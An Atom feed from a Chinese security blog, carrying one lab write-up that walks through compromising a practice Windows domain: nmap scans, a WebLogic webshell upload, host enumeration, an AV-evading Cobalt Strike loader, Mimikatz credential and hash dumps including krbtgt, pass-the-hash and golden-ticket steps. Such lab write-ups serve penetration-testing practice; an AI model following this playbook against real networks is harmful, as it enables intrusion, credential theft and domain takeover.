<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.yyxyy.xyz/</id>
    <title>Yyx</title>
    <updated>2021-10-09T01:38:49.130Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.yyxyy.xyz/"/>
    <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
    <subtitle>记得在这杂乱的生活里，带点微笑</subtitle>
    <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
    <icon>https://www.yyxyy.xyz/favicon.ico</icon>
    <rights>All rights reserved 2021, Yyx</rights>
    <entry>
        <title type="html"><![CDATA[靶场练习2]]></title>
        <id>https://www.yyxyy.xyz/post/ba-chang-lian-xi-2/</id>
        <link href="https://www.yyxyy.xyz/post/ba-chang-lian-xi-2/">
        </link>
        <updated>2021-10-09T01:29:01.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="0x01-环境准备">0x01 环境准备</h1>
<p>1.kali外网攻击机，win10外网攻击机</p>
<p>2.win2008  R2 双网卡1，开启weblogic服务</p>
<p>3.win7，双网卡</p>
<p>4.win2012 R2 仅主机模式</p>
<h1 id="0x02-信息收集">0x02 信息收集</h1>
<p>1.win2008</p>
<pre><code class="language-shell">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:40 EDT
Nmap scan report for 192.168.227.131
Host is up (0.00047s latency).
Not shown: 989 filtered ports
PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft IIS httpd 7.5
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000; SP2
3389/tcp  open  ms-wbt-server?
7001/tcp  open  http           Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 00:0C:29:17:20:A8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7
OS CPE: cpe:/o:microsoft:windows_7
OS details: Microsoft Windows 7
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
</code></pre>
<p>2.win7</p>
<pre><code class="language-shell">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:54 EDT
Nmap scan report for 192.168.227.130
Host is up (0.00047s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:0A:C1:79 (VMware)
Device type: general purpose
Running: Microsoft Windows Vista|7|8.1
OS CPE: cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista, Windows 7 SP1, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: PC; OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.74 seconds
</code></pre>
<p>3.发现121.137存在7001端口，尝试扫描漏洞。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/1.png" alt="1632140760712" loading="lazy"></figure>
<p>4.发现均打开445端口，但是不存在漏洞</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/2.png" alt="1632141297037" loading="lazy"></figure>
<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
<p>上传冰蝎马：</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/3.png" alt="1632142789764" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/4.png" alt="1632142885873" loading="lazy"></figure>
<h1 id="0x04-主机信息收集">0x04 主机信息收集</h1>
<p>administrator权限、存在域、双网卡</p>
<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;whoami
de1ay\administrator

C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;ipconfig/all

Windows IP 配置

   主机名  . . . . . . . . . . . . . : WEB
   主 DNS 后缀 . . . . . . . . . . . : de1ay.com
   节点类型  . . . . . . . . . . . . : 混合
   IP 路由已启用 . . . . . . . . . . : 否
   WINS 代理已启用 . . . . . . . . . : 否
   DNS 后缀搜索列表  . . . . . . . . : de1ay.com
                                       localdomain

以太网适配器 本地连接 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-B2
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::189d:8528:d537:fa88%13(首选) 
   IPv4 地址 . . . . . . . . . . . . : 10.10.10.80(首选) 
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 10.10.10.1
   DHCPv6 IAID . . . . . . . . . . . : 301993001
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : localdomain
   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-A8
   DHCP 已启用 . . . . . . . . . . . : 是
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::f017:d7f6:4a44:3137%11(首选) 
   IPv4 地址 . . . . . . . . . . . . : 192.168.227.131(首选) 
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   获得租约的时间  . . . . . . . . . : 2021年9月21日 14:46:47
   租约过期的时间  . . . . . . . . . : 2021年9月21日 15:46:46
   默认网关. . . . . . . . . . . . . : 192.168.227.2
   DHCP 服务器 . . . . . . . . . . . : 192.168.227.254
   DHCPv6 IAID . . . . . . . . . . . : 234884137
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
   主 WINS 服务器  . . . . . . . . . : 192.168.227.2
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

隧道适配器 isatap.{AD80CD23-D97F-4814-A715-9248D845EA0F}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是

隧道适配器 isatap.localdomain:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : localdomain
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
</code></pre>
<p>win2008 R2默认可以抓明文密码</p>
<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;systeminfo

主机名:           WEB
OS 名称:          Microsoft Windows Server 2008 R2 Standard 
OS 版本:          6.1.7601 Service Pack 1 Build 7601
OS 制造商:        Microsoft Corporation
OS 配置:          成员服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:     Windows 用户
注册的组织:       
产品 ID:          00477-001-0000421-84103
初始安装日期:     2019/9/8, 19:01:04
系统启动时间:     2021/9/20, 17:10:08
系统制造商:       VMware, Inc.
系统型号:         VMware Virtual Platform
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2501 Mhz
BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     2,047 MB
可用的物理内存:   909 MB
虚拟内存: 最大值: 4,095 MB
虚拟内存: 可用:   2,800 MB
虚拟内存: 使用中: 1,295 MB
页面文件位置:     C:\pagefile.sys
域:               de1ay.com
登录服务器:       暂缺
修补程序:         安装了 3 个修补程序。
                  [01]: KB2999226
                  [02]: KB958488
                  [03]: KB976902
网卡:             安装了 2 个 NIC。
                  [01]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接
                      启用 DHCP:   是
                      DHCP 服务器: 192.168.227.254
                      IP 地址
                        [01]: 192.168.227.131
                        [02]: fe80::f017:d7f6:4a44:3137
                  [02]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接 2
                      启用 DHCP:   否
                      IP 地址
                        [01]: 10.10.10.80
                        [02]: fe80::189d:8528:d537:fa88
</code></pre>
<p>网卡:             安装了 2 个 NIC。<br>
<a href="KB2999226">01</a>: Intel(R) PRO/1000 MT Network Connection<br>
连接名:      本地连接<br>
启用 DHCP:   是<br>
DHCP 服务器: 192.168.227.254<br>
IP 地址<br>
<a href="KB2999226">01</a>: 192.168.227.131<br>
<a href="KB958488">02</a>: fe80::f017:d7f6:4a44:3137<br>
​                  <a href="KB958488">02</a>: Intel(R) PRO/1000 MT Network Connection<br>
​                      连接名:      本地连接 2<br>
​                      启用 DHCP:   否<br>
​                      IP 地址<br>
<a href="KB2999226">01</a>: 10.10.10.80<br>
<a href="KB958488">02</a>: fe80::189d:8528:d537:fa88</p>
<p>查看进程，发现存在360的主动防御</p>
<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;tasklist/svc

映像名称                       PID 服务                                        
========================= ======== ============================================
System Idle Process              0 暂缺                                        
System                           4 暂缺                                        
smss.exe                       256 暂缺                                        
csrss.exe                      344 暂缺                                        
wininit.exe                    404 暂缺                                        
services.exe                   500 暂缺                                        
lsass.exe                      508 Netlogon, SamSs                             
lsm.exe                        516 暂缺                                        
svchost.exe                    604 DcomLaunch, PlugPlay, Power                 
vmacthlp.exe                   664 VMware Physical Disk Helper Service         
svchost.exe                    708 RpcEptMapper, RpcSs                         
svchost.exe                    796 Dhcp, eventlog, lmhosts                     
svchost.exe                    848 AeLookupSvc, Appinfo, CertPropSvc, gpsvc,   
                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    
                                   Schedule, SENS, SessionEnv,                 
                                   ShellHWDetection, Winmgmt, wuauserv         
svchost.exe                    912 EventSystem, netprofm, nsi, sppuinotify,    
                                   W32Time                                     
svchost.exe                    952 Netman, TrkWks, UmRdpService, UxSms         
ZhuDongFangYu.exe              988 ZhuDongFangYu                               
svchost.exe                    124 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc                                      
svchost.exe                    264 BFE, DPS, MpsSvc                            
spoolsv.exe                   1180 Spooler                                     
svchost.exe                   1212 AppHostSvc                                  
sqlservr.exe                  1400 MSSQL$SQLEXPRESS                            
SMSvcHost.exe                 1480 NetPipeActivator, NetTcpActivator,          
                                   NetTcpPortSharing                           
sqlwriter.exe                 1900 SQLWriter                                   
VGAuthService.exe             1948 VGAuthService                               
vmtoolsd.exe                  1988 VMTools                                     
svchost.exe                   2028 W3SVC, WAS                                  
fdlauncher.exe                1760 MSSQLFDLauncher$SQLEXPRESS                  
svchost.exe                   1740 TermService                                 
svchost.exe                   1876 PolicyAgent                                 
fdhost.exe                     836 暂缺                                        
conhost.exe                    888 暂缺                                        
dllhost.exe                   2244 COMSysApp                                   
msdtc.exe                     2420 MSDTC                                       
WmiPrvSE.exe                  2620 暂缺                                        
sppsvc.exe                    2124 sppsvc                                      
csrss.exe                      968 暂缺                                        
winlogon.exe                  2472 暂缺                                        
taskhost.exe                  3048 暂缺                                        
dwm.exe                       1608 暂缺                                        
explorer.exe                  1712 暂缺                                        
vmtoolsd.exe                  3008 暂缺                                        
cmd.exe                       3060 暂缺                                        
conhost.exe                   2924 暂缺                                        
mmc.exe                       2580 暂缺                                        
TrustedInstaller.exe          1476 TrustedInstaller                            
cmd.exe                       2428 暂缺                                        
conhost.exe                   2264 暂缺                                        
java.exe                       496 暂缺                                        
cmd.exe                        488 暂缺                                        
conhost.exe                   2692 暂缺                                        
sc.exe                        2104 暂缺                                        
cmd.exe                       1796 暂缺                                        
conhost.exe                   3020 暂缺                                        
sc.exe                        3004 暂缺                                        
cmd.exe                       2600 暂缺                                        
conhost.exe                   2788 暂缺                                        
sc.exe                        2524 暂缺                                        
cmd.exe                        292 暂缺                                        
conhost.exe                    336 暂缺                                        
sc.exe                         356 暂缺                                        
cmd.exe                       1468 暂缺                                        
conhost.exe                   1824 暂缺                                        
tasklist.exe                  2164 暂缺 
</code></pre>
<p>尝试上线cs</p>
<p>存在360，所以需要免杀的马，这里我使用我写的shellcodeloader，完美过360.</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/5.png" alt="1632211789400" loading="lazy"></figure>
<h1 id="0x05-内网信息收集以及横向">0x05 内网信息收集以及横向</h1>
<p>密码抓取，发现域控DC登录过。</p>
<pre><code class="language-shell">Authentication Id : 0 ; 9556781 (00000000:0091d32d)
Session           : CachedInteractive from 2
User Name         : Administrator
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2021/9/21 15:40:41
SID               : S-1-5-21-2756371121-2868759905-3853650604-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : DE1AY
	 * LM       : f67ce55ac831223dc187b8085fe1d9df
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	wdigest :	
	 * Username : Administrator
	 * Domain   : DE1AY
	 * Password : 1qaz@WSX
	kerberos :	
	 * Username : Administrator
	 * Domain   : de1ay.com
	 * Password : 1qaz@WSX
	ssp :	
	credman :
</code></pre>
<p>使用net view以及hash传递上线。</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/6.png" alt="1632216003567" loading="lazy"></figure>
<h1 id="0x06-域权限维持">0x06 域权限维持</h1>
<p>域控密码抓取</p>
<pre><code class="language-shell">Authentication Id : 0 ; 226447 (00000000:0003748f)
Session           : Interactive from 1
User Name         : de1ay
Domain            : DE1AY
Logon Server      : DC
Logon Time        : 2021/9/20 17:12:55
SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
	msv :	
	 [00000003] Primary
	 * Username : de1ay
	 * Domain   : DE1AY
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	 [00010000] CredentialKeys
	 * NTLM     : 161cff084477fe596a5db81874498a24
	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
	tspkg :	
	wdigest :	
	 * Username : de1ay
	 * Domain   : DE1AY
	 * Password : (null)
	kerberos :	
	 * Username : de1ay
	 * Domain   : DE1AY.COM
	 * Password : (null)
	ssp :	KO
	credman :
	
beacon&gt; hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 82501 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:191fbaef80e1b2641b0e79f03c634ce4:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:288707796e6021d379ae70f0acd53e88:::
WEB$:1603:aad3b435b51404eeaad3b435b51404ee:6aeba9f5141c4f8d47a1c26173aecb26:::
</code></pre>
<p>​</p>
<p>伪造黄金票据</p>
<p>条件：</p>
<p>1.域名称</p>
<p>2.域的SID值</p>
<p>3.域的KRBTGT账户NTLM密码哈希</p>
<p>4.伪造用户名</p>
<p>具体操作参考：https://blog.csdn.net/qq_32731075/article/details/118193887</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/7.png" alt="1632220218868" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/8.png" alt="1632220391203" loading="lazy"></figure>
]]></summary>
        <content type="html"><![CDATA[<h1 id="0x01-环境准备">0x01 环境准备</h1>
<p>1.kali外网攻击机，win10外网攻击机</p>
<p>2.win2008  R2 双网卡1，开启weblogic服务</p>
<p>3.win7，双网卡</p>
<p>4.win2012 R2 仅主机模式</p>
<h1 id="0x02-信息收集">0x02 信息收集</h1>
<p>1.win2008</p>
<pre><code class="language-shell">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:40 EDT
Nmap scan report for 192.168.227.131
Host is up (0.00047s latency).
Not shown: 989 filtered ports
PORT      STATE SERVICE        VERSION
80/tcp    open  http           Microsoft IIS httpd 7.5
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000; SP2
3389/tcp  open  ms-wbt-server?
7001/tcp  open  http           Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 00:0C:29:17:20:A8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7
OS CPE: cpe:/o:microsoft:windows_7
OS details: Microsoft Windows 7
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
</code></pre>
<p>2.win7</p>
<pre><code class="language-shell">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:54 EDT
Nmap scan report for 192.168.227.130
Host is up (0.00047s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:0A:C1:79 (VMware)
Device type: general purpose
Running: Microsoft Windows Vista|7|8.1
OS CPE: cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista, Windows 7 SP1, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: PC; OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.74 seconds
</code></pre>
<p>3.发现121.137存在7001端口，尝试扫描漏洞。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/1.png" alt="1632140760712" loading="lazy"></figure>
<p>4.发现均打开445端口，但是不存在漏洞</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/2.png" alt="1632141297037" loading="lazy"></figure>
<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
<p>上传冰蝎马：</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/3.png" alt="1632142789764" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/4.png" alt="1632142885873" loading="lazy"></figure>
<h1 id="0x04-主机信息收集">0x04 主机信息收集</h1>
<p>administrator权限、存在域、双网卡</p>
<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;whoami
de1ay\administrator

C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;ipconfig/all

Windows IP 配置

   主机名  . . . . . . . . . . . . . : WEB
   主 DNS 后缀 . . . . . . . . . . . : de1ay.com
   节点类型  . . . . . . . . . . . . : 混合
   IP 路由已启用 . . . . . . . . . . : 否
   WINS 代理已启用 . . . . . . . . . : 否
   DNS 后缀搜索列表  . . . . . . . . : de1ay.com
                                       localdomain

以太网适配器 本地连接 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-B2
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::189d:8528:d537:fa88%13(首选) 
   IPv4 地址 . . . . . . . . . . . . : 10.10.10.80(首选) 
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 10.10.10.1
   DHCPv6 IAID . . . . . . . . . . . : 301993001
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : localdomain
   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-A8
   DHCP 已启用 . . . . . . . . . . . : 是
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::f017:d7f6:4a44:3137%11(首选) 
   IPv4 地址 . . . . . . . . . . . . : 192.168.227.131(首选) 
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   获得租约的时间  . . . . . . . . . : 2021年9月21日 14:46:47
   租约过期的时间  . . . . . . . . . : 2021年9月21日 15:46:46
   默认网关. . . . . . . . . . . . . : 192.168.227.2
   DHCP 服务器 . . . . . . . . . . . : 192.168.227.254
   DHCPv6 IAID . . . . . . . . . . . : 234884137
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
   主 WINS 服务器  . . . . . . . . . : 192.168.227.2
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

隧道适配器 isatap.{AD80CD23-D97F-4814-A715-9248D845EA0F}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是

隧道适配器 isatap.localdomain:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : localdomain
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
</code></pre>
<p>win2008 R2默认可以抓明文密码</p>
<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;systeminfo

主机名:           WEB
OS 名称:          Microsoft Windows Server 2008 R2 Standard 
OS 版本:          6.1.7601 Service Pack 1 Build 7601
OS 制造商:        Microsoft Corporation
OS 配置:          成员服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:     Windows 用户
注册的组织:       
产品 ID:          00477-001-0000421-84103
初始安装日期:     2019/9/8, 19:01:04
系统启动时间:     2021/9/20, 17:10:08
系统制造商:       VMware, Inc.
系统型号:         VMware Virtual Platform
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2501 Mhz
BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     2,047 MB
可用的物理内存:   909 MB
虚拟内存: 最大值: 4,095 MB
虚拟内存: 可用:   2,800 MB
虚拟内存: 使用中: 1,295 MB
页面文件位置:     C:\pagefile.sys
域:               de1ay.com
登录服务器:       暂缺
修补程序:         安装了 3 个修补程序。
                  [01]: KB2999226
                  [02]: KB958488
                  [03]: KB976902
网卡:             安装了 2 个 NIC。
                  [01]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接
                      启用 DHCP:   是
                      DHCP 服务器: 192.168.227.254
                      IP 地址
                        [01]: 192.168.227.131
                        [02]: fe80::f017:d7f6:4a44:3137
                  [02]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接 2
                      启用 DHCP:   否
                      IP 地址
                        [01]: 10.10.10.80
                        [02]: fe80::189d:8528:d537:fa88
</code></pre>
<p>网卡:             安装了 2 个 NIC。<br>
<a href="KB2999226">01</a>: Intel(R) PRO/1000 MT Network Connection<br>
连接名:      本地连接<br>
启用 DHCP:   是<br>
DHCP 服务器: 192.168.227.254<br>
IP 地址<br>
<a href="KB2999226">01</a>: 192.168.227.131<br>
<a href="KB958488">02</a>: fe80::f017:d7f6:4a44:3137<br>
​                  <a href="KB958488">02</a>: Intel(R) PRO/1000 MT Network Connection<br>
​                      连接名:      本地连接 2<br>
​                      启用 DHCP:   否<br>
​                      IP 地址<br>
<a href="KB2999226">01</a>: 10.10.10.80<br>
<a href="KB958488">02</a>: fe80::189d:8528:d537:fa88</p>
<p>查看进程，发现存在360的主动防御</p>
<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;tasklist/svc

映像名称                       PID 服务                                        
========================= ======== ============================================
System Idle Process              0 暂缺                                        
System                           4 暂缺                                        
smss.exe                       256 暂缺                                        
csrss.exe                      344 暂缺                                        
wininit.exe                    404 暂缺                                        
services.exe                   500 暂缺                                        
lsass.exe                      508 Netlogon, SamSs                             
lsm.exe                        516 暂缺                                        
svchost.exe                    604 DcomLaunch, PlugPlay, Power                 
vmacthlp.exe                   664 VMware Physical Disk Helper Service         
svchost.exe                    708 RpcEptMapper, RpcSs                         
svchost.exe                    796 Dhcp, eventlog, lmhosts                     
svchost.exe                    848 AeLookupSvc, Appinfo, CertPropSvc, gpsvc,   
                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    
                                   Schedule, SENS, SessionEnv,                 
                                   ShellHWDetection, Winmgmt, wuauserv         
svchost.exe                    912 EventSystem, netprofm, nsi, sppuinotify,    
                                   W32Time                                     
svchost.exe                    952 Netman, TrkWks, UmRdpService, UxSms         
ZhuDongFangYu.exe              988 ZhuDongFangYu                               
